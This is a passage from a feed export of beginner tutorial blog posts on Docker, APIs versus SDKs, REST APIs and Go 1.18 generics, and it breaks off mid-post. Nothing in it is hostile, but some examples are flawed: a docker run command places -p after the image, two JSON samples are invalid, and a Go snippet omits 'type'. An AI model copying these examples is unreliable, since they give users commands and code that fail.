<blockquote class="maps-to-line"><p><strong>Docker</strong> is an open platform for developing, shipping, and running applications. Docker enables you to separate your applications from your infrastructure so you can deliver software quickly. With Docker, you can manage your infrastructure in the same ways you manage your applications. By taking advantage of Docker’s methodologies for shipping, testing, and deploying code quickly, you can significantly reduce the delay between writing code and running it in production.</p></blockquote>
<p class="maps-to-line">The official definition isn&#8217;t that hard to understand, right?</p>
<p class="maps-to-line">Simplified Definition</p>
<blockquote class="maps-to-line"><p><strong>Docker</strong> is a tool to automate the deployment of an application as a lightweight container so that the application can work efficiently in different environments.</p></blockquote>
<blockquote class="maps-to-line"><p>Let&#8217;s try to relate Docker with Our example above.</p></blockquote>
<p class="maps-to-line">As software Engineers, We always heard almost every day that, a project working perfectly on my machine may be some issue with your(another teammate&#8217;s) pc or the server pc and the blame game starts.</p>
<p class="maps-to-line">This is what Docker trying to solve,</p>
<blockquote class="maps-to-line"><p>This works on my machine&#8230;</p></blockquote>
<p class="maps-to-line">Every single project runs on every machine without any problem with minimal dependencies to set up. Project code works fine on the developer machine but as soon as it is deployed or moved to a new teammate&#8217;s pc, it doesn&#8217;t work like it was expected.</p>
<blockquote class="maps-to-line"><p>Docker is like a <strong>blank box</strong> when you as a developer put your files moves into a new place and it works no matter where you place that box.</p></blockquote>
<p class="maps-to-line">This blank box where you put your code, in docker term, it&#8217;s called <strong>Containers</strong>. These containers are the absolute heart of the docker. when every time you take these containers it&#8217;s going to work absolutely and exactly like how it worked on your machine. Docker also allows us to publish this as an image to the public or private registry like docker hub, AWS ECR, Harbor, etc. So that others can also use your code on other projects as if you run on your pc.</p>
<p class="maps-to-line">A simple example can be given like these, Suppose you need an older version of MySQL for a particular project and your pc has the latest version of MySQL so to install the other version of MySQL you need to stop your latest MySQL service and then install the older which is tedious most of the time. But using docker it will take a single command to install the required version of MySQL without stopping your latest MySQL version.</p>
<div class="joplin-editable">
<pre class="EnlighterJSRAW" data-enlighter-language="bash">docker run --name mymysql -e MYSQL_ROOT_PASSWORD=my-secret-pw -d mysql:latest -p 3310:3306</pre>
<pre class="hljs"><code>
</code>Let's break down the command for better understanding...</pre>
</div>
<p class="maps-to-line"><code class="inline-code">docker</code>: represents the executable</p>
<p class="maps-to-line"><code class="inline-code">run</code>: this is a subcommand. There&#8217;re lots of other commands. To check we can use <code class="inline-code">docker --help</code>.</p>
<p class="maps-to-line"><code class="inline-code">--name</code>: will set a custom name to the container. If not provided it will set a random name for the container.</p>
<p class="maps-to-line"><code class="inline-code">-e</code>: represents environment variables. if we have multiple environment variables then we have to add <code class="inline-code">-e</code> for each.</p>
<p class="maps-to-line"><code class="inline-code">-d</code>: means to run the container as detached mode.</p>
<p class="maps-to-line"><code class="inline-code">mysql:latest</code>: is the image(a set of instructions) itself which will be used to generate the container.</p>
<p class="maps-to-line"><code class="inline-code">-p</code>: refer to <code class="inline-code">port</code>. we always write like this <code class="inline-code">3310:3306</code> which actually means <code class="inline-code">&lt;local_pc_port&gt;:&lt;container_port&gt;</code>. Also if your PC port and the container port are the same then <code class="inline-code">3306</code> we can exclude the <code class="inline-code">:3306</code>.</p>
<blockquote class="maps-to-line">
<h5 id="noteto-remember-this-i-always-think-like-this-ports-always-start-from-your-local-pc-port-to-the-docker-container-port">Note:To remember this, I always think like this, ports always start from your local pc port to the docker container port.</h5>
</blockquote>
<p>If you like, you can read the same article on my <a href="https://rezwanul-haque.hashnode.dev/what-is-docker" rel="nofollow noopener" target="_blank">[Personal blog]</a></p>
<blockquote>
<h4>You can read my other blog-posts <a href="https://rezwanul-haque.hashnode.dev/" rel="nofollow noopener" target="_blank">[Here]</a></h4>
</blockquote>
<p class="maps-to-line">In Conclusion, Docker is often used as a “development tool” by developers who want to ensure that they have required dependencies in the development environment without including them in their codebase or having to learn about those dependencies on each new machine that they use for development.</p>
]]></content:encoded>
					
					<wfw:commentRss>/blog/what-is-docker/feed/</wfw:commentRss>
			<slash:comments>0</slash:comments>
		
		
			</item>
		<item>
		<title>API vs SDK: What&#8217;re the differences?</title>
		<link>/blog/api-vs-sdk-whatre-the-differences/</link>
					<comments>/blog/api-vs-sdk-whatre-the-differences/#respond</comments>
		
		<dc:creator><![CDATA[Rezwanul Haque]]></dc:creator>
		<pubDate>Thu, 11 Aug 2022 11:23:55 +0000</pubDate>
				<category><![CDATA[Data]]></category>
		<category><![CDATA[api]]></category>
		<category><![CDATA[differences]]></category>
		<category><![CDATA[Http]]></category>
		<category><![CDATA[Representational State Transfer]]></category>
		<category><![CDATA[sdk]]></category>
		<category><![CDATA[Software Development Kit]]></category>
		<guid isPermaLink="false">/?p=10005</guid>

					<description><![CDATA[]]></description>
										<content:encoded><![CDATA[<div class="et_pb_section et_pb_section_0 et_section_regular" >
				
				
				
				
				
				
				<div class="et_pb_row et_pb_row_0">
				<div class="et_pb_column et_pb_column_4_4 et_pb_column_0  et_pb_css_mix_blend_mode_passthrough et-last-child">
				
				
				
				
				<div class="et_pb_module et_pb_text et_pb_text_0  et_pb_text_align_left et_pb_bg_layout_light">
				
				
				
				
				<div class="et_pb_text_inner"><p class="maps-to-line">As beginner software engineers, we always start with a good understanding of the basics. Like other beginners in any field, we sometimes get confused by technical terminologies. What is an API and what is an SDK?</p>
<p class="maps-to-line">Every programmer needs to understand how APIs and SDKs work together with their respective systems. APIs and SDKs are more technical aspects of computer programming that are often used in tandem – but have distinct differences, as well.</p>
<h2 id="exploring-api-vs-sdk-whats-the-difference" class="maps-to-line">Exploring API vs SDK: What&#8217;re the differences</h2>
<p class="maps-to-line">The terms API and SDK are often used interchangeably, especially when we want to download prebuilt software from a website. But, we shouldn&#8217;t confuse them with each other. Let&#8217;s compare API and SDK to make sure what each one does – and how you should relate to them in your software development environment.</p>
<p class="maps-to-line">Let&#8217;s say we&#8217;re developing a mobile app for a client or trying out some fun ideas to showcase, the idea is for this mobile app to allow a client to take a picture of a plant and the app will communicate with the visual recognition service which is running on the cloud. The idea is for the service to return the plant&#8217;s name and bring up short descriptions like what genre the plant belongs to, what the scientific name the plant has, etc.</p>
<blockquote class="maps-to-line">
<p>Now the question arises how do we do this communication between the mobile app and the cloud-based service?</p>
</blockquote>
<p class="maps-to-line">Hmmm&#8230; Well, that&#8217;s where APIs and SDKs come in.<br />Let&#8217;s start with APIs first.</p>
<blockquote class="maps-to-line">
<p>API is a technology that allows two programs to communicate with each other.</p>
</blockquote>
<p class="maps-to-line">So, first of all, APIs are all about communication. So there are a set of definitions and protocols that are always used for apps or services to talk to other apps or services how to give the example of the plant recognition system above. So basically we can think of them as a bridge between our app and other services. We want to talk to in our case the cloud-based recognition service.</p>
<p class="maps-to-line">We talk a lot about API. What it stands for anyways.</p>
<blockquote class="maps-to-line">
<p>API &#8211; Application Programming Interface</p>
</blockquote>
<p class="maps-to-line">Now we need to understand what are some of the aspects of APIs that makes them useful.</p>
<ol>
<li class="maps-to-line"><strong>Communication</strong> &#8211; So communicating between service to another service or an app to another app or an app to the backend server, etc.</li>
<li class="maps-to-line"><strong>Abstraction</strong> &#8211; What this means is, inside the recognition service there would be lots of code probably thousands of lines of code running up but we as mobile app developers don&#8217;t want to have to worry about how the recognition service will figure out those plant information or which function call will give the correct results, other metadata, etc. This complicated logic will be abstracted away by the API. Which simplifies the process for the app developer.</li>
<li class="maps-to-line"><strong>Standardized</strong> &#8211; This means that there are industry-defined standards for how to define an API. There&#8217;re a few formats that are popular for APIs like SOAP, REST, GraphQL, or RPC.</li>
</ol>
<h2 id="we-will-focus-on-rest-for-api-which-stands-for" class="maps-to-line">We will focus on REST for API which stands for</h2>
<blockquote class="maps-to-line">
<p>REST &#8211; Representational State Transfer</p>
</blockquote>
<p class="maps-to-line">If we want to talk about REST then we have to establish some of the building blocks of APIs first to understand REST.</p>
<p class="maps-to-line">First, we have to be able to send a request to the server or a specific service in our case recognition service. So, for a REST API call <code class="inline-code">request</code> we need to have some blocks.</p>
<ol>
<li class="maps-to-line"><strong>Operation</strong> &#8211; This could be HTTP methods like POST, GET, PUT, PATCH, etc. In our case, we&#8217;ll use POST as we want to send an image file to the recognition service.</li>
<li class="maps-to-line"><strong>Parameters</strong> &#8211; Although this is Optional. In our case, the file name of the plant pictures is like <code class="inline-code">plant.jpg</code> as a multi-part form of data.</li>
<li class="maps-to-line"><strong>Endpoint</strong> &#8211; This part will be exposed by the recognition service where we need to send the file like <code class="inline-code">https://littlegiants.io/analize</code></li>
<li class="maps-to-line"><strong>Headers</strong> &#8211; This is a special part of a REST API request which might have things like an API key or some authentication data.</li>
</ol>
<p class="maps-to-line">The above four points act as a request in an API call.</p>
<p class="maps-to-line">So Now the question is what will be the response of the API call?</p>
<p class="maps-to-line">Typically it&#8217;s some form of raw data, maybe JSON(Which Stands for Javascript Object Notation) or maybe XML(Extended Markup language), etc. In JSON it might look like below</p>
<pre class="EnlighterJSRAW" data-enlighter-language="json">{
    "type": "iris",
    "plant_name": "Iris Setosa"
}</pre>
<p class="maps-to-line">So, we understand the building blocks of what an API is, but the question arises, As a developer, how do we call an API from our code? In our case, As a mobile app developer, we don&#8217;t want to set up the request with all the above building blocks of operations, parameters, and endpoints and deal with raw JSON objects, right?</p>
<blockquote class="maps-to-line">
<h2 id="thats-where-sdks-come-in-and-shine">That&#8217;s where SDKs come in and shine.</h2>
</blockquote>
<h2 id="what-is-sdk" class="maps-to-line">What is SDK?</h2>
<div class="joplin-editable">
<blockquote>
<pre class="hljs">SDK - Software Development Kit</pre>
</blockquote>
</div>
<p class="maps-to-line">So, we can easily think of SDK as a toolbox of tools or code that calls the APIs for us. Awesome, right? So, we may be specialized in one programming language over the other. Hmm&#8230; there are SDKs in a variety of languages. So there&#8217;s maybe an SDK in Java, Python, Golang, etc. Whichever language is our specialty there&#8217;s probably an SDK for us to use which is exposed by the recognition service developers or some open source community.</p>
<p class="maps-to-line">Back to our example, What might an SDK look like in that example?<br />In the Mobile app, we&#8217;ll use the SDK tool which is provided by recognition service developers or some open source community. Since it&#8217;s a mobile app we&#8217;ll use the Flutter SDK. In the flutter SDK, rather than having to configure our request manually with all these building blocks of an API as we explains above, you might call just a method, that may be called, <code class="inline-code">analizePlantImage</code> and that will call those various API building blocks like the Operations, Parameters, Endpoints and request the API from our code. In response, we&#8217;ll get a response but it won&#8217;t be necessarily a JSON object, but it might be some code or some model.</p>
<pre class="EnlighterJSRAW" data-enlighter-language="dart">import 'package:reconize/plant.dart';

Plant plant = await plant.analizePlantImage("plant.jpg");

print(plant.toJson());</pre>
<p class="maps-to-line">In the <code class="inline-code">analizePlantImage</code> method we need to pass the pant file name binary file <code class="inline-code">plant.jpg</code>, the SDK will set the required parameters for the API call and send the request to the recognition service and in response, we can go ahead and set a label in our mobile app from that response object via the SDK and we&#8217;re able to see plant name after analyzed.</p>
<p class="maps-to-line">So, hopefully, This kind of summarizes what an API and an SDK are. What&#8217;re they used for and how they truly fundamental tools in our serverless cloud app development?</p>
<div class="joplin-editable">
<pre class="hljs"><code></code></pre>
</div></div>
			</div>
			</div>
				
				
				
				
			</div>
				
				
			</div>
]]></content:encoded>
					
					<wfw:commentRss>/blog/api-vs-sdk-whatre-the-differences/feed/</wfw:commentRss>
			<slash:comments>0</slash:comments>
		
		
			</item>
		<item>
		<title>What is REST API?</title>
		<link>/blog/what-is-rest-api/</link>
					<comments>/blog/what-is-rest-api/#respond</comments>
		
		<dc:creator><![CDATA[Rezwanul Haque]]></dc:creator>
		<pubDate>Wed, 10 Aug 2022 06:42:37 +0000</pubDate>
				<category><![CDATA[Programming & Development]]></category>
		<category><![CDATA[Personal]]></category>
		<category><![CDATA[Technology]]></category>
		<category><![CDATA[api]]></category>
		<category><![CDATA[Basics]]></category>
		<category><![CDATA[Http]]></category>
		<category><![CDATA[microservices]]></category>
		<category><![CDATA[REST]]></category>
		<guid isPermaLink="false">/?p=9944</guid>

					<description><![CDATA[Let&#8217;s go through an example to understand what a REST API is. Let&#8217;s say that we work for a cloud kitchen and we want to build a web application that can give you how much stock particular items suppose ice cream flavors are available and the worker working on the physical location of the kitchen [&#8230;]]]></description>
										<content:encoded><![CDATA[<p class="maps-to-line">Let&#8217;s go through an example to understand what a REST API is. Let&#8217;s say that we work for a cloud kitchen and we want to build a web application that can give you how much stock particular items suppose ice cream flavors are available and the worker working on the physical location of the kitchen makes updates to those flavors. So the question arises how do we do this?</p>
<blockquote class="maps-to-line">
<h3 id="the-answer-will-be-with-a-rest-api">The answer will be with a REST API.</h3>
</blockquote>
<p class="maps-to-line">Most of the application today uses 3-tier architecture. Some complex systems can even have an n-tier architecture which we called <code class="inline-code">microservices</code>, which will be explained in another post in the future.<br />
So In 3-tier architecture&#8230;</p>
<ul>
<li class="maps-to-line">Backend (Application tier)</li>
<li class="maps-to-line">Frontend (Presentation tier)</li>
<li class="maps-to-line">Database (Data tier)</li>
</ul>
<p class="maps-to-line">So we have our frontend app or web page communicate with a cloud-based backend server via a REST API. We use the term REST API whenever our Frontend app communicates with our Backend server. So Let&#8217;s jump into what exactly a REST API is.</p>
<h3 id="what-does-rest-stand-for" class="maps-to-line">What does <code class="inline-code">REST</code> stand for?</h3>
<blockquote class="maps-to-line"><p>REST &#8211; Representational State Transfer.</p></blockquote>
<p class="maps-to-line">This is a type of web communications protocol that allows browsers to access data from a server using the HTTP or HTTPS protocols. RESTful architecture is an approach to designing and building software systems such as websites, mobile applications, and web services that use HTTP methods to manipulate resources residing on the server. RESTful APIs are becoming more popular because they are lightweight, easy to use and consume, and easy to read and understand. They allow for easier integration with front-end developers&#8217; code. A RESTful API can be accessed via different devices such as computers and smartphones by using a library or framework known as a client library.</p>
<p class="maps-to-line">It&#8217;s a standardized software architecture style which is a specific type of API that&#8217;s an industry known and used.</p>
<p class="maps-to-line">The first thing that we have to know about REST API is, that they&#8217;re all about communications. So this is how our frontend application communicates with our backend server. Sometimes we also heard RESTFUL Web service, which means is when a service that uses REST APIs to communicate. Let&#8217;s go through some of the benefits of REST API</p>
<ol>
<li class="maps-to-line"><strong>Simple/Standardized</strong> &#8211; approach to communication. We don&#8217;t have to worry about how to format our data or how to format each request coming to our system.</li>
<li class="maps-to-line"><strong>Scale</strong> &#8211; As our service grows in complexity, we can make modifications to handle a large number of requests</li>
<li class="maps-to-line"><strong>Stateless</strong> &#8211; we don&#8217;t have to worry about what data is in which state they&#8217;re in and keep track of that across client and server.</li>
<li class="maps-to-line"><strong>High Performance</strong> &#8211; even though our service gets more complex the performance remains very high.</li>
<li class="maps-to-line"><strong>Cache</strong> &#8211; It supports caching too.</li>
</ol>
<p class="maps-to-line">Let&#8217;s back to our example again, for the cloud kitchen shop, a REST API would look like the below&#8230;</p>
<p class="maps-to-line">We have an endpoint that might look something like this: <code class="inline-code">https://api.littlegiants.io/v1/items</code><br />
So <code class="inline-code">api.littlegiants.io</code> is our DNS(Domain Name Server) for our backend application and the <code class="inline-code">api</code> part signifies it&#8217;s an API subdomain and <code class="inline-code">v1</code> means it&#8217;s the version one of that API and <code class="inline-code">items</code> represents a <code class="inline-code">resource</code>. So, this signifies that we&#8217;re working with the <code class="inline-code">items</code> resource in this REST API.</p>
<p class="maps-to-line">In our example, we can build some blocks to define REST API.</p>
<p class="maps-to-line">First, we have to be able to send a request to the server or a specific service in our case cloud kitchen service. So, for a REST API call <code class="inline-code">request</code> we need to have some blocks.</p>
<p class="maps-to-line">Lets break <code class="inline-code">Request</code> &amp; <code class="inline-code">Response</code> apart a little bit. Let&#8217;s say <code class="inline-code">Request</code> as a big black box.<br />
First things first, let&#8217;s define the type of things that we might want to do with a REST API. What actions or verbs would we want to use when working with one?<br />
As a developer, we have all heard of <code class="inline-code">CRUD</code> &#8211; what does <code class="inline-code">CRUD</code> stands for?</p>
<ul>
<li class="maps-to-line">Create</li>
<li class="maps-to-line">Read</li>
<li class="maps-to-line">Update</li>
<li class="maps-to-line">Delete</li>
</ul>
<p class="maps-to-line">So what&#8217;ll be the equivalent of <code class="inline-code">Create</code> in an HTTP method? Well, it&#8217;s <code class="inline-code">POST</code>. How about <code class="inline-code">Read</code> &#8211; it&#8217;s <code class="inline-code">GET</code>. An update would be <code class="inline-code">PUT</code>, Also Note if you want a partial update we use <code class="inline-code">PATCH</code> and for <code class="inline-code">DELETE</code> we use <code class="inline-code">DELETE</code> HTTP methods.</p>
<p class="maps-to-line">The <code class="inline-code">Request</code> itself has some blocks which will be explained below&#8230;</p>
<ol>
<li class="maps-to-line"><strong>Operation</strong> &#8211; This could be HTTP methods like POST, GET, PUT, PATCH, etc. In our case, we&#8217;ll use PATCH to update the item stock in our application.</li>
<li class="maps-to-line"><strong>Parameters/Body</strong> &#8211; Although this is Optional. In our case, we send a JSON object as a body stating the current stock of the item in our system.</li>
<li class="maps-to-line"><strong>Endpoint</strong> &#8211; This part will be exposed by the cloud kitchen service where we need to send the resource&#8217;s current state to the endpoint. <code class="inline-code">https://api.littlegiants.io/v1/items</code></li>
<li class="maps-to-line"><strong>Headers</strong> &#8211; This is a special part of a REST API request which might have things like an API key or some authentication data.</li>
</ol>
<p class="maps-to-line">The above four points act as a request in a REST API call.</p>
<p class="maps-to-line">So now the question is what will be the response of the REST API call? Typically it&#8217;s some form of raw data, maybe JSON(Which Stands for Javascript Object Notation) or maybe XML(Extended Markup language), etc. In JSON it might look like below</p>
<div class="joplin-editable">
<pre class="EnlighterJSRAW" data-enlighter-language="json">{
    "message": "items updated"
}</pre>
<p>&nbsp;</p>
</div>
<p class="maps-to-line">Let&#8217;s look at a few different scenarios that might happen with our cloud kitchen shop. So let&#8217;s say that we want to display what&#8217;s products we&#8217;re selling in the shop. For that, we have to get the items we have in the shop. From the <code class="inline-code">Request</code> point of view how it looks like?<br />
Well, we have the <code class="inline-code">GET</code> HTTP method as the operation, the endpoint is <code class="inline-code">https://api.littlegiants.io/v1/items</code>, Also parameters can be set to get a single item in the endpoint, headers are some <code class="inline-code">Authorization: Bearer access_token</code> for authenticated endpoints.<br />
In response, we&#8217;ll get a list of item resources.</p>
<pre class="EnlighterJSRAW" data-enlighter-language="json">{
    [
        {
            "item_id": 1,
            "name": "Burger",
            "price": 10,
            "stock": 5
        },
        {
            "item_id": 2,
            "name": "Sandwitch",
            "price": 8,
            "stock": 3
        }
    ]
}</pre>
<p class="maps-to-line">So we get some items like burgers, sandwiches, etc. In our shop let&#8217;s say a Sandwich is so popular that it runs out for the day and the store is scrambling and they want to update the stock of that item. So let&#8217;s say they want to update the Sandwich stock so that they can sell Sandwich.<br />
Well, we have the <code class="inline-code">PUT</code> HTTP method as the operation, the endpoint is <code class="inline-code">https://api.littlegiants.io/v1/items/2</code>, Also parameters 2 represent the Sandwich item in the endpoint also in the body we add the latest stock value as json,</p>
<pre class="EnlighterJSRAW" data-enlighter-language="json">{
    "name": "Sandwitch",
    "price": 8,
    "stock": 10
}</pre>
<p class="maps-to-line">headers are some <code class="inline-code">Authorization: Bearer access_token</code> for authenticated endpoints.</p>
<p class="maps-to-line">Let&#8217;s say we want to add a new item in the store like <code class="inline-code">Ice cream</code>. Well, we have the <code class="inline-code">POST</code> HTTP method as the operation, the endpoint is <code class="inline-code">https://api.littlegiants.io/v1/items</code>, As body, we add the latest item value as json,</p>
<div class="joplin-editable">
<pre class="EnlighterJSRAW" data-enlighter-language="json">{
    "name": "Ice Cream",
    "price": 4,
    "stock": 10
}</pre>
</div>
<p class="maps-to-line">headers are some <code class="inline-code">Authorization: Bearer access_token</code> for authenticated endpoints.<br />
In response, we see a response like below</p>
<div class="joplin-editable">
<pre class="EnlighterJSRAW" data-enlighter-language="json">{
    "item_id": 3
    "name": "Ice Cream",
    "price": 4,
    "stock": 10
}</pre>
</div>
<p class="maps-to-line">Let&#8217;s say some item is not selling at all in the shop so the store owner decided to remove it from the store. Well, we have the <code class="inline-code">DELETE</code> HTTP method as the operation, the endpoint is <code class="inline-code">https://api.littlegiants.io/v1/items/3</code>, Also parameters 3 represent the item in the endpoint, headers are some <code class="inline-code">Authorization: Bearer access_token</code> for authenticated endpoints.</p>
<p>If you like, you can read the same article on my <a href="https://rezwanul-haque.hashnode.dev/what-is-rest-api" rel="nofollow noopener" target="_blank">[Personal blog]</a></p>
<blockquote>
<h4>You can read my other blog-posts <a href="https://rezwanul-haque.hashnode.dev/" rel="nofollow noopener" target="_blank">[Here]</a></h4>
</blockquote>
<p class="maps-to-line">In Conclusion, We&#8217;re hoping that this clarifies what exactly is a REST API. What are some of the benefits? What&#8217;s a real-world example look like and how are the REST APIs fundamental to cloud-based application development?</p>
]]></content:encoded>
					
					<wfw:commentRss>/blog/what-is-rest-api/feed/</wfw:commentRss>
			<slash:comments>0</slash:comments>
		
		
			</item>
		<item>
		<title>Generics In Golang 1.18</title>
		<link>/blog/generics-in-golang-1-18/</link>
					<comments>/blog/generics-in-golang-1-18/#respond</comments>
		
		<dc:creator><![CDATA[Rezwanul Haque]]></dc:creator>
		<pubDate>Tue, 24 May 2022 13:00:24 +0000</pubDate>
				<category><![CDATA[Programming & Development]]></category>
		<category><![CDATA[Technology]]></category>
		<category><![CDATA[generics]]></category>
		<category><![CDATA[golang]]></category>
		<category><![CDATA[new feature]]></category>
		<guid isPermaLink="false">/?p=8626</guid>

					<description><![CDATA[When we start using Golang, The simplicity of the language and its awesome way to handle threads(goroutine), and also its speed, make us happy that our code works so fast that sometimes the result came within a nanosecond(ns). Apart from these good sides when we work on a project we sometimes copy-paste lots of code, [&#8230;]]]></description>
										<content:encoded><![CDATA[<p class="maps-to-line">When we start using Golang, The simplicity of the language and its awesome way to handle threads(goroutine), and also its speed, make us happy that our code works so fast that sometimes the result came within a nanosecond(ns). Apart from these good sides when we work on a project we sometimes copy-paste lots of code, but it&#8217;s not because of a specific software engineer practicing bad code but it needs to be done because of the need. For example,</p>
<div class="joplin-editable">
<pre><code class="language-go">func Abs(x int64) int64 {
	if x &lt; 0 {
		return -x
	}
	return x
}</code></pre>
</div>
<p class="maps-to-line">I&#8217;m writing an absolute value printing function. The parameter I&#8217;m expecting is an int64 but If I need a similar feature for any other type like int32, int, uint, float, float32, float64, etc. In the current Go stable (&lt;1.18) version currently, we can&#8217;t do this as go didn&#8217;t have any generics. A possible workaround for this feature to implement in the current stable(&lt;1.18) release of Golang would be to use <code class="inline-code">interface{}</code>, <code class="inline-code">type assertion</code> or <code class="inline-code">reflect</code> standard package which will check the type and then decide what to do next.</p>
<div class="joplin-editable">
<pre><code class="language-go">import &quot;reflect&quot;

// interface with type assertion &amp; reflect example
func Abs(x interface{}) interface{} {
	switch reflect.TypeOf(x).Kind() {
	case reflect.Int64:
		if x.(int64) &lt; 0 {
			return -x.(int64)
		}
		return x.(int64)
	case reflect.Int:
		if x.(int) &lt; 0 {
			return -x.(int)
		}
		return x.(int)
	}

	return 0
}</code></pre>
</div>
<p class="maps-to-line">But this above function has some problems as it&#8217;s not following the single responsibility principle from SOLID(Awesome principles to follow when developing software or any other work) principle.<br />
Another problem with using <code class="inline-code">interface</code> is that the static type checking is ignored if anyone passes multiple types in the above function.</p>
<h2 id="here-comes-the-good-news" class="maps-to-line">Here comes the good news</h2>
<p class="maps-to-line">The good news is from go 1.18 and above. Now we can define generics.<br />
It&#8217;s already in the stable release of go 1.18 so anyone wish to test this feature, do so by installing the &gt;1.18 versions.<br />
You can install <code class="inline-code">go1.18 </code>by running the below two commands then run the program by <code class="inline-code">go1.18</code>.</p>
<div class="joplin-editable">
<pre><code class="language-bash">// command 1
go install go1.18
// command 2
go1.18 download

// running the program
go1.18 run main.go</code></pre>
</div>
<blockquote class="maps-to-line"><p>You can also read my other blog <a href="/installing-multiple-version-of-golang-using-goenv">Installing Multiple Versions of Golang using GoEnv</a></p></blockquote>
<p class="maps-to-line">Generics allow our functions or data structures to take in several types that are defined in their generic form.</p>
<div class="joplin-editable">
<pre><code class="language-go">func Abs[T int | int32 | int64 | float32 | float64](x T) T {
	if x &lt; 0 {
		return -x
	}
	return x
}</code></pre>
</div>
<p class="maps-to-line">Some may say that this is a <code class="inline-code">Syntactic Sugar</code> of the language to give generics but the major difference between <code class="inline-code">interface{} with type assertion</code> and <code class="inline-code">generics</code> is that generics can use the static type checker to give runtime validation on the type of the parameter.</p>
<p class="maps-to-line">The above code may get weird as you add more and more types in it and also want to reuse the type in multiple places so we can move that to a new type like below</p>
<div class="joplin-editable">
<pre><code class="language-go">type Number interface {
	int | int32 | int64 | float32 | float64
}

func Abs[T Number](x T) T {
	if x &lt; 0 {
		return -x
	}
	return x
}</code></pre>
</div>
<p class="maps-to-line">Still defining all the types in that interface has lots of work but if you want to get rid of these you can use <code class="inline-code">constraints</code></p>
<h2 id="constaints" class="maps-to-line">Constaints</h2>
<p class="maps-to-line">Generics come with some constraints so we can ignore type all the types. There are a few constraints right now, maybe add more later.</p>
<ul>
<li class="maps-to-line">any</li>
<li class="maps-to-line">comparable</li>
</ul>
<h3 id="any-constraint" class="maps-to-line"><code class="inline-code">any</code> Constraint</h3>
<p class="maps-to-line"><code class="inline-code">any</code> constraint, which is comparable to the empty <code class="inline-code">interface{}</code>, because it means the type in the variable could be anything.</p>
<p class="maps-to-line">The <code class="inline-code">any</code> constraint works great if we’re treating the value like a bucket of data,<br />
maybe we’re moving it around, but you don’t care at all about what’s in the bucket.</p>
<pre><code class="language-go">package main

import &quot;fmt&quot;

type A struct {
	Name string
}
type B struct {
	Name string
}

func Print[T any](x T) {
	fmt.Println(x)
	return
}

func main() {
	a := A{}
	a.Name = &quot;hello&quot;
	b := B{}
	b.Name = &quot;world&quot;
	Print(a)
	Print(&quot;nice&quot;)
	Print(b)
}</code></pre>
<p class="maps-to-line">You can read the <a title="https://go.googlesource.com/proposal/+/refs/heads/master/design/43651-type-parameters.md" href="https://go.googlesource.com/proposal/+/refs/heads/master/design/43651-type-parameters.md" data-from-md="" rel="nofollow noopener" target="_blank">Generics proposal</a>, the operations permitted for <code class="inline-code">any</code> type are as follows.</p>
<ol>
<li class="maps-to-line">Declare variables of any types</li>
<li class="maps-to-line">Assign other values of the same type to those variables</li>
<li class="maps-to-line">Pass those variables to functions or return them from functions</li>
<li class="maps-to-line">Take the address of those variables</li>
<li class="maps-to-line">Convert or assign values of those types to the type interface{}</li>
<li class="maps-to-line">Convert a value of type T to type T (permitted but useless)</li>
<li class="maps-to-line">Use a type assertion to convert an interface value to the type</li>
<li class="maps-to-line">Use the type as a case in a type switch</li>
<li class="maps-to-line">Define and use composite types that use those types, such as a slice of that type</li>
<li class="maps-to-line">Pass the type to some predeclared functions such as new<br />
If we do need to know more about the generic types we’re working on we can constrain them using interfaces like the above.</li>
</ol>
<h3 id="comparable-constraint" class="maps-to-line"><code class="inline-code">comparable</code> Constraint</h3>
<p class="maps-to-line">Comparable is also a predefined containts which is allowed us use the <code class="inline-code">!=</code> and <code class="inline-code">==</code> operators within your function logic</p>
<div class="joplin-editable">
<pre><code class="language-go">func indexOf[T comparable](s []T, x T) (int, error) {
    for i, v := range s {
        if v == x {
            return i, nil
        }
    }
    return 0, errors.New(&quot;not found&quot;)
}

func main() {
    idx, err := indexOf([]string{&quot;pinapple&quot;, &quot;banana&quot;, &quot;pear&quot;}, &quot;banana&quot;)
    fmt.Println(idx, err) // output: 1
}</code></pre>
</div>
<h3 id="custom-constraints" class="maps-to-line">Custom Constraints</h3>
<p class="maps-to-line">Our interface definitions, which can later be used as constraints can take their own type parameters.</p>
<div class="joplin-editable">
<pre><code class="language-go">type buildingUpgrader[S small, M medium] interface {
    Upgrade(S) M
}</code></pre>
</div>
<p class="maps-to-line">small, medium is defined as interface.</p>
<h3 id="type-lists" class="maps-to-line">Type lists</h3>
<p class="maps-to-line">simply list a bunch of types to get a new interface/constraint.</p>
<div class="joplin-editable">
<pre><code class="language-go">// Ordered is a type constraint that matches any ordered type.
// An ordered type is one that supports the &lt;, &lt;=, &gt;, and &gt;= operators.
type Ordered interface {
    ~int | ~int8 | ~int16 | ~int32 | ~int64 |
        ~uint | ~uint8 | ~uint16 | ~uint32 | ~uint64 | ~uintptr |
        ~float32 | ~float64 |
        ~string
}</code></pre>
</div>
<h3 id="mixed" class="maps-to-line">Mixed</h3>
<div class="joplin-editable">
<pre><code class="language-go">type ComparableStringer interface {
    comparable
    String() string
}</code></pre>
</div>
<h3 id="self-referential" class="maps-to-line">Self referential</h3>
<div class="joplin-editable">
<pre><code class="language-go">Cloneable interface {
    Clone() Cloneable
}</code></pre>
</div>
<h3 id="generic-types-vs-generic-functions" class="maps-to-line">Generic Types vs Generic Functions</h3>
<p class="maps-to-line">So we know that we can write functions that use generic types, but what if we want to create a custom type that can contain generic types? For example, a slice of order-able objects. The <a title="https://go.googlesource.com/proposal/+/refs/heads/master/design/43651-type-parameters.md#operations-based-on-type-sets" href="https://go.googlesource.com/proposal/+/refs/heads/master/design/43651-type-parameters.md#operations-based-on-type-sets" data-from-md="" rel="nofollow noopener" target="_blank">new proposal</a> makes this possible.</p>
<div class="joplin-editable">
<pre><code class="language-go">type comparableSlice[T comparable] []T

func allEqual[T comparable](s comparableSlice[T]) bool {
    if len(s) == 0 {
        return true
    }
    last := s[0]
    for _, cur := range s[1:] {
        if cur != last {
            return false
        }
        last = cur
    }
    return true 
}

func main() {
    fmt.Println(allEqual([]int{4,6,2}))
    // false

    fmt.Println(allEqual([]int{1,1,1}))
    // true
}</code></pre>
</div>
<p class="maps-to-line">Let&#8217;s implement a practical example and try to implement bubble sort using generics</p>
<div class="joplin-editable">
<pre><code class="language-go">import (
	&quot;fmt&quot;
)

type Number interface {
	int8 | int16 | int32 | int64 | float32 | float64
}

func BubbleSort[N Number](input []N) []N {
	n := len(input)
	swapped := true
	for swapped {
		swapped = false
		for idx := 0; idx &lt; n-1; idx++ {
			if input[idx] &gt; input[idx+1] {
				input[idx], input[idx+1] = input[idx+1], input[idx]
				swapped = true
			}
		}
	}
	return input
}
